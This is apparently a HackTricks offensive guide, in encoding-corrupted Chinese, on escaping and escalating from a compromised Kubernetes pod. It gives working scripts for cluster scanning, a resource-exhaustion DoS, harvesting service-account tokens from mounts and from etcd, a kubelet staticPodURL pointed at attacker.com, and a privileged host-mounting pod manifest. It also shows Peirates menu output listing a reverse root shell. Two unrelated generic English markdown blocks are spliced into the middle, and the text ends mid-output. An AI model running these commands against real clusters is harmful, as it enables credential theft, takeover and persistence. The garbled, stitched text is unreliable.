# ä» Pod å†…éƒ¨æ”»å‡» Kubernetes

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ä¸Š**å…³æ³¨**æˆ‘ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## **Pod é€ƒé€¸**

**å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œä½ å¯èƒ½èƒ½å¤Ÿä»ä¸­é€ƒè„±åˆ°èŠ‚ç‚¹ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### ä» Pod ä¸­é€ƒè„±

ä¸ºäº†å°è¯•ä» Pod ä¸­é€ƒè„±ï¼Œæ‚¨å¯èƒ½éœ€è¦**æå‡æƒé™**ï¼Œä¸€äº›å¯ç”¨çš„æŠ€æœ¯åŒ…æ‹¬ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

æ‚¨å¯ä»¥æ£€æŸ¥è¿™äº›**Docker é€ƒé€¸**å°è¯•é€ƒè„±å·²è¢«æ”»ç ´çš„ Podï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### æ»¥ç”¨ Kubernetes æƒé™

å¦‚**kubernetes æšä¸¾**éƒ¨åˆ†æ‰€è¿°ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ï¼ŒPod æ˜¯ä»¥å…¶ä¸­çš„**æœåŠ¡è´¦æˆ·ä»¤ç‰Œ**è¿è¡Œçš„ã€‚è¯¥æœåŠ¡è´¦æˆ·å¯èƒ½é™„æœ‰ä¸€äº›**æƒé™**ï¼Œæ‚¨å¯ä»¥**æ»¥ç”¨**è¿™äº›æƒé™**ç§»åŠ¨**åˆ°å…¶ä»– Podï¼Œç”šè‡³**é€ƒè„±**åˆ°é›†ç¾¤å†…é…ç½®çš„èŠ‚ç‚¹ã€‚æŸ¥çœ‹æ–¹æ³•ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### æ»¥ç”¨äº‘æƒé™

å¦‚æœ Pod åœ¨**äº‘ç¯å¢ƒ**ä¸­è¿è¡Œï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿ**ä»å…ƒæ•°æ®ç«¯ç‚¹æ³„æ¼ä»¤ç‰Œ**å¹¶ä½¿ç”¨å®ƒæå‡æƒé™ã€‚

## æœç´¢æ˜“å—æ”»å‡»çš„ç½‘ç»œæœåŠ¡

ç”±äºæ‚¨åœ¨ Kubernetes ç¯å¢ƒä¸­ï¼Œå¦‚æœæ— æ³•é€šè¿‡æ»¥ç”¨å½“å‰ Pod çš„æƒé™æå‡æƒé™ï¼Œä¹Ÿæ— æ³•é€ƒè„±å®¹å™¨ï¼Œæ‚¨åº”è¯¥**æœç´¢æ½œåœ¨çš„æ˜“å—æ”»å‡»æœåŠ¡ã€‚**

### æœåŠ¡

**ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥å°è¯•è·å– Kubernetes ç¯å¢ƒä¸­çš„æ‰€æœ‰æœåŠ¡ï¼š**
```
kubectl get svc --all-namespaces
```
é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubernetesä½¿ç”¨å¹³é¢ç½‘ç»œæ¶æ„ï¼Œè¿™æ„å‘³ç€**é›†ç¾¤ä¸­çš„ä»»ä½•pod/serviceéƒ½å¯ä»¥ç›¸äº’é€šä¿¡**ã€‚é›†ç¾¤ä¸­çš„**å‘½åç©ºé—´**é»˜è®¤æƒ…å†µä¸‹**æ²¡æœ‰ä»»ä½•ç½‘ç»œå®‰å…¨é™åˆ¶**ã€‚å‘½åç©ºé—´ä¸­çš„ä»»ä½•äººéƒ½å¯ä»¥ä¸å…¶ä»–å‘½åç©ºé—´é€šä¿¡ã€‚

### æ‰«æ

ä»¥ä¸‹Bashè„šæœ¬ï¼ˆå–è‡ª[Kubernetes workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ï¼‰å°†å®‰è£…å¹¶æ‰«ækubernetesé›†ç¾¤çš„IPèŒƒå›´ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼Œäº†è§£å¦‚ä½•**æ”»å‡»Kubernetesç‰¹å®šæœåŠ¡**ä»¥**å±å®³å…¶ä»–Pod/æ•´ä¸ªç¯å¢ƒ**ï¼š

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### å—…æ¢

å¦‚æœ**è¢«å…¥ä¾µçš„Podæ­£åœ¨è¿è¡Œä¸€äº›æ•æ„ŸæœåŠ¡**ï¼Œå…¶ä»–Podéœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å—…æ¢æœ¬åœ°é€šä¿¡**æ¥è·å–å…¶ä»–Podå‘é€çš„å‡­æ®ã€‚

## ç½‘ç»œæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¸å¦‚**ARPæ¬ºéª—**ï¼ˆä»¥åŠç”±æ­¤å¼•å‘çš„**DNSæ¬ºéª—**ï¼‰ç­‰æŠ€æœ¯åœ¨Kubernetesç½‘ç»œä¸­èµ·ä½œç”¨ã€‚ç„¶åï¼Œåœ¨Podå†…éƒ¨ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰**NET\_RAWåŠŸèƒ½**ï¼ˆé»˜è®¤æƒ…å†µä¸‹å­˜åœ¨ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿå‘é€è‡ªå®šä¹‰ç²¾å¿ƒåˆ¶ä½œçš„ç½‘ç»œæ•°æ®åŒ…ï¼Œå¹¶é€šè¿‡**ARPæ¬ºéª—å¯¹è¿è¡Œåœ¨åŒä¸€èŠ‚ç‚¹ä¸­çš„æ‰€æœ‰Podæ‰§è¡Œä¸­é—´äººæ”»å‡»**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœ**æ¶æ„Pod**æ­£åœ¨**ä¸DNSæœåŠ¡å™¨è¿è¡Œåœ¨åŒä¸€èŠ‚ç‚¹**ï¼Œæ‚¨å°†èƒ½å¤Ÿå¯¹é›†ç¾¤ä¸­çš„æ‰€æœ‰Podæ‰§è¡Œ**DNSæ¬ºéª—æ”»å‡»**ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## èŠ‚ç‚¹æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰

åœ¨Kubernetesæ¸…å•ä¸­æ²¡æœ‰èµ„æºè§„èŒƒï¼Œä¸”å®¹å™¨æ²¡æœ‰**åº”ç”¨é™åˆ¶**èŒƒå›´ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬å¯ä»¥**æ¶ˆè€—Pod/éƒ¨ç½²è¿è¡Œçš„æ‰€æœ‰èµ„æº**ï¼Œä½¿å…¶ä»–èµ„æºæ¯ç«­ï¼Œå¹¶å¯¼è‡´ç¯å¢ƒå‘ç”ŸDoSã€‚

å¯ä»¥ä½¿ç”¨è¯¸å¦‚[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ä¹‹ç±»çš„å·¥å…·æ¥æ‰§è¡Œæ­¤æ“ä½œï¼š
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
æ‚¨å¯ä»¥åœ¨è¿è¡Œ`stress-ng`æ—¶å’Œä¹‹åçœ‹åˆ°å·®å¼‚
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## èŠ‚ç‚¹åæ¸—é€

å¦‚æœä½ æˆåŠŸ**é€ƒç¦»å®¹å™¨**ï¼Œåœ¨èŠ‚ç‚¹ä¸­ä½ ä¼šå‘ç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼š

- **å®¹å™¨è¿è¡Œæ—¶**è¿›ç¨‹ï¼ˆDockerï¼‰
- åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ›´å¤š**pod/å®¹å™¨**ï¼Œä½ å¯ä»¥åƒè¿™ä¸ªä¸€æ ·æ»¥ç”¨ï¼ˆæ›´å¤šä»¤ç‰Œï¼‰
- æ•´ä¸ª**æ–‡ä»¶ç³»ç»Ÿ**å’Œ**æ“ä½œç³»ç»Ÿ**ä¸€èˆ¬æƒ…å†µ
- **Kube-Proxy** æœåŠ¡æ­£åœ¨ç›‘å¬
- **Kubelet** æœåŠ¡æ­£åœ¨ç›‘å¬ã€‚æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼š
  - ç›®å½•ï¼š`/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- å…¶ä»–**Kuberneteså¸¸è§æ–‡ä»¶**ï¼š
  - `$HOME/.kube/config` - **ç”¨æˆ·é…ç½®**
  - `/etc/kubernetes/kubelet.conf`- **å¸¸è§„é…ç½®**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **å¼•å¯¼é…ç½®**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd é…ç½®**
  - `/etc/kubernetes/pki` - **Kubernetes å¯†é’¥**

### æŸ¥æ‰¾èŠ‚ç‚¹ kubeconfig

å¦‚æœä½ åœ¨ä¹‹å‰æ³¨é‡Šçš„è·¯å¾„ä¸­æ‰¾ä¸åˆ° kubeconfig æ–‡ä»¶ï¼Œè¯·æ£€æŸ¥ kubelet è¿›ç¨‹çš„å‚æ•° `--kubeconfig`ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### çªƒå–æœºå¯†
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
è„šæœ¬ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) å°†è‡ªåŠ¨è·å–å…¶ä»– pod çš„ä»¤ç‰Œï¼Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦å…·æœ‰æ‚¨æ­£åœ¨å¯»æ‰¾çš„æƒé™ï¼ˆè€Œä¸æ˜¯æ‚¨é€ä¸ªæŸ¥çœ‹ï¼‰ã€‚
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æƒ DaemonSets

ä¸€ä¸ª DaemonSet æ˜¯ä¸€ä¸ª**pod**ï¼Œå°†åœ¨**é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œ**ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ª DaemonSet é…ç½®äº†ä¸€ä¸ª**ç‰¹æƒæœåŠ¡è´¦æˆ·**ï¼Œåœ¨**æ‰€æœ‰èŠ‚ç‚¹**ä¸­ä½ å°†èƒ½å¤Ÿæ‰¾åˆ°é‚£ä¸ª**ç‰¹æƒæœåŠ¡è´¦æˆ·**çš„**ä»¤ç‰Œ**ï¼Œä½ å¯ä»¥æ»¥ç”¨å®ƒã€‚

è¿™ä¸ªæ¼æ´ä¸å‰ä¸€èŠ‚ä¸­çš„ç›¸åŒï¼Œä½†ç°åœ¨ä½ ä¸å†ä¾èµ–è¿æ°”ã€‚

### åˆ‡æ¢åˆ°äº‘ç«¯

å¦‚æœé›†ç¾¤ç”±äº‘æœåŠ¡ç®¡ç†ï¼Œé€šå¸¸**èŠ‚ç‚¹**å°†æœ‰ä¸åŒçš„è®¿é—®**å…ƒæ•°æ®**ç«¯ç‚¹çš„æƒé™ï¼Œä¸ Pod ä¸åŒã€‚å› æ­¤ï¼Œå°è¯•ä»èŠ‚ç‚¹ï¼ˆæˆ–ä» hostNetwork ä¸º True çš„ podï¼‰**è®¿é—®å…ƒæ•°æ®ç«¯ç‚¹**ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### çªƒå– etcd

å¦‚æœä½ å¯ä»¥æŒ‡å®šå°†è¿è¡Œå®¹å™¨çš„èŠ‚ç‚¹çš„[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ï¼Œåœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹å†…è·å–ä¸€ä¸ª shell å¹¶è·å–**etcd æ•°æ®åº“**ï¼š
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-planeèŠ‚ç‚¹å…·æœ‰**ä¸»èŠ‚ç‚¹è§’è‰²**ï¼Œåœ¨**äº‘æ‰˜ç®¡é›†ç¾¤ä¸­ï¼Œæ‚¨å°†æ— æ³•åœ¨å…¶ä¸­è¿è¡Œä»»ä½•å†…å®¹**ã€‚

#### ä»etcdä¸­è¯»å–æœºå¯†

å¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨podè§„èŒƒä¸­çš„`nodeName`é€‰æ‹©å™¨åœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šè¿è¡Œæ‚¨çš„podï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½å¾ˆå®¹æ˜“è®¿é—®åŒ…å«é›†ç¾¤æ‰€æœ‰é…ç½®ï¼ˆåŒ…æ‹¬æ‰€æœ‰æœºå¯†ï¼‰çš„`etcd`æ•°æ®åº“ã€‚

ä»¥ä¸‹æ˜¯ä»æ­£åœ¨è¿è¡Œåœ¨æ‚¨æ‰€åœ¨çš„æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šçš„`etcd`ä¸­è·å–æœºå¯†çš„ä¸€ç§å¿«é€Ÿè€Œç®€å•çš„æ–¹æ³•ã€‚å¦‚æœæ‚¨æƒ³è¦ä¸€ä¸ªæ›´ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`etcd`å®¢æˆ·ç«¯å®ç”¨ç¨‹åº`etcdctl`çš„podï¼Œå¹¶ä½¿ç”¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹çš„å‡­æ®è¿æ¥åˆ°`etcd`ï¼Œæ— è®ºå®ƒåœ¨ä½•å¤„è¿è¡Œï¼Œè¯·æŸ¥çœ‹@mauilionçš„[æ­¤ç¤ºä¾‹æ¸…å•](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ã€‚

**æ£€æŸ¥`etcd`æ˜¯å¦åœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œå¹¶æŸ¥çœ‹æ•°æ®åº“æ‰€åœ¨ä½ç½®ï¼ˆè¿™æ˜¯åœ¨ä½¿ç”¨`kubeadm`åˆ›å»ºçš„é›†ç¾¤ä¸Šï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

In a Kubernetes cluster, if an attacker gains access to a pod, they can potentially escalate their privileges to gain control over the entire cluster. This guide explores various techniques that attackers can use to move laterally within a Kubernetes cluster and escalate their privileges.

### Techniques for Escalating Privileges

#### 1. Accessing the Kubernetes API Server

Attackers can access the Kubernetes API server from inside a compromised pod. This can allow them to interact with the API server and perform actions such as creating new pods, deploying malicious applications, or deleting existing resources.

#### 2. Exploiting Service Accounts

Service accounts are used by pods to authenticate and interact with the Kubernetes API server. Attackers can exploit misconfigured service accounts to gain additional privileges within the cluster.

#### 3. Mounting Host Paths

By mounting host paths into a pod, attackers can access sensitive host resources such as configuration files, binaries, or other pods running on the same node. This can lead to further privilege escalation within the cluster.

### Conclusion

Securing pods within a Kubernetes cluster is crucial to prevent attackers from moving laterally and escalating their privileges. By understanding these techniques, security teams can better protect their Kubernetes environments from internal threats.
```
```bash
data-dir=/var/lib/etcd
```
**æŸ¥çœ‹ etcd æ•°æ®åº“ä¸­çš„æ•°æ®ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ä»æ•°æ®åº“ä¸­æå–ä»¤ç‰Œå¹¶æ˜¾ç¤ºæœåŠ¡è´¦æˆ·åç§°**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ç›¸åŒå‘½ä»¤ï¼Œä½†æ·»åŠ ä¸€äº›grepå‘½ä»¤ä»¥ä»…è¿”å›kube-systemå‘½åç©ºé—´ä¸­çš„é»˜è®¤ä»¤ç‰Œ**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section covers various techniques that an attacker can use to escalate privileges and move laterally within the Kubernetes cluster.

### Escalating Privileges

#### Exploiting Kubernetes Service Account Tokens

Kubernetes pods use service account tokens to authenticate with the API server. If an attacker gains access to a pod, they can potentially access the service account token mounted within the pod. This token can be used to interact with the Kubernetes API and perform actions based on the permissions associated with the service account.

#### Accessing the Kubernetes API Server

Once an attacker has a valid service account token, they can interact with the Kubernetes API server. This access can be used to gather information about the cluster, create or delete resources, and perform other administrative actions.

### Moving Laterally

#### Accessing Other Pods

With access to the Kubernetes API server, an attacker can discover and access other pods within the cluster. This lateral movement allows the attacker to compromise additional pods and potentially gain access to more sensitive information or resources.

#### Exploiting Misconfigured RBAC Policies

If the cluster has misconfigured Role-Based Access Control (RBAC) policies, an attacker can exploit these misconfigurations to escalate privileges and access resources they should not be able to interact with. This can lead to further compromise of the cluster's security.

### Conclusion

Gaining access to a Kubernetes pod can be a critical security issue, as it provides attackers with a foothold to escalate privileges and move laterally within the cluster. It is essential for organizations to secure their Kubernetes clusters properly to prevent such attacks.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### é™æ€/é•œåƒåŒ–PodæŒä¹…æ€§

_é™æ€Pod_ç”±ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„kubeletå®ˆæŠ¤ç¨‹åºç›´æ¥ç®¡ç†ï¼Œè€Œæ— éœ€APIæœåŠ¡å™¨è§‚å¯Ÿå®ƒä»¬ã€‚ä¸ç”±æ§åˆ¶å¹³é¢ç®¡ç†çš„Podï¼ˆä¾‹å¦‚ï¼Œéƒ¨ç½²ï¼‰ä¸åŒï¼›**kubeletä¼šç›‘è§†æ¯ä¸ªé™æ€Pod**ï¼ˆå¦‚æœå¤±è´¥ï¼Œåˆ™é‡æ–°å¯åŠ¨ï¼‰ã€‚

å› æ­¤ï¼Œé™æ€Podå§‹ç»ˆ**ç»‘å®šåˆ°ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„ä¸€ä¸ªKubelet**ã€‚

**kubeletä¼šè‡ªåŠ¨å°è¯•ä¸ºæ¯ä¸ªé™æ€Podåœ¨Kubernetes APIæœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªé•œåƒPod**ã€‚è¿™æ„å‘³ç€åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„Podåœ¨APIæœåŠ¡å™¨ä¸Šå¯è§ï¼Œä½†æ— æ³•ä»é‚£é‡Œæ§åˆ¶ã€‚Podåç§°å°†ä»¥èŠ‚ç‚¹ä¸»æœºåä½œä¸ºåç¼€ï¼Œå¹¶å¸¦æœ‰ä¸€ä¸ªå‰å¯¼è¿å­—ç¬¦ã€‚

{% hint style="danger" %}
é™æ€Podçš„**`spec`ä¸èƒ½å¼•ç”¨å…¶ä»–APIå¯¹è±¡**ï¼ˆä¾‹å¦‚ï¼ŒServiceAccountï¼ŒConfigMapï¼ŒSecretç­‰ã€‚å› æ­¤ï¼Œ**æ— æ³•åˆ©ç”¨æ­¤è¡Œä¸ºå¯åŠ¨å…·æœ‰ä»»æ„ServiceAccountçš„Pod**ä»¥å±å®³é›†ç¾¤ã€‚ä½†æ‚¨å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½åœ¨ä¸åŒå‘½åç©ºé—´ä¸­è¿è¡ŒPodï¼ˆå¦‚æœå‡ºäºæŸç§åŸå› æœ‰ç”¨ï¼‰ã€‚
{% endhint %}

å¦‚æœæ‚¨åœ¨èŠ‚ç‚¹ä¸»æœºå†…éƒ¨ï¼Œå¯ä»¥è®©å…¶åˆ›å»ºä¸€ä¸ª**é™æ€Podåœ¨è‡ªèº«å†…éƒ¨**ã€‚è¿™éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºè¿™å¯èƒ½å…è®¸æ‚¨åœ¨**ä¸åŒå‘½åç©ºé—´**ï¼ˆå¦‚**kube-system**ï¼‰ä¸­åˆ›å»ºä¸€ä¸ªPodã€‚

è¦åˆ›å»ºé™æ€Podï¼Œ[**æ–‡æ¡£æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¸®åŠ©**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚æ‚¨åŸºæœ¬ä¸Šéœ€è¦2ä»¶äº‹ï¼š

* åœ¨**kubeletæœåŠ¡**ä¸­é…ç½®å‚æ•°**`--pod-manifest-path=/etc/kubernetes/manifests`**ï¼Œæˆ–åœ¨**kubeleté…ç½®**ä¸­ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰å¹¶é‡æ–°å¯åŠ¨æœåŠ¡
* åœ¨**`/etc/kubernetes/manifests`**ä¸­çš„**podå®šä¹‰**ä¸­åˆ›å»ºå®šä¹‰

**å¦ä¸€ç§æ›´éšè”½çš„æ–¹æ³•æ˜¯ï¼š**

* ä¿®æ”¹**kubelet**é…ç½®æ–‡ä»¶ä¸­çš„å‚æ•°**`staticPodURL`**ï¼Œè®¾ç½®ç±»ä¼¼`staticPodURL: http://attacker.com:8765/pod.yaml`ã€‚è¿™å°†ä½¿kubeletè¿›ç¨‹ä»æŒ‡å®šçš„URLè·å–**é…ç½®æ¥åˆ›å»ºé™æ€Pod**ã€‚

**ç¤ºä¾‹**çš„**pod**é…ç½®ï¼Œç”¨äºåœ¨**kube-system**ä¸­åˆ›å»ºä¸€ä¸ªç‰¹æƒpodï¼Œå–è‡ª[**è¿™é‡Œ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### åˆ é™¤ pods + æ— æ³•è°ƒåº¦çš„èŠ‚ç‚¹

å¦‚æœæ”»å‡»è€…å·²ç»**å…¥ä¾µäº†ä¸€ä¸ªèŠ‚ç‚¹**ï¼Œå¹¶ä¸”å¯ä»¥ä»å…¶ä»–èŠ‚ç‚¹**åˆ é™¤ pods**ï¼Œå¹¶ä¸”**ä½¿å…¶ä»–èŠ‚ç‚¹æ— æ³•æ‰§è¡Œ pods**ï¼Œé‚£ä¹ˆ pods å°†åœ¨å—æŸèŠ‚ç‚¹ä¸Šé‡æ–°è¿è¡Œï¼Œä»–å°†èƒ½å¤Ÿ**çªƒå– tokens** å¹¶åœ¨å…¶ä¸­è¿è¡Œã€‚\
æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®æ­¤é“¾æ¥**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
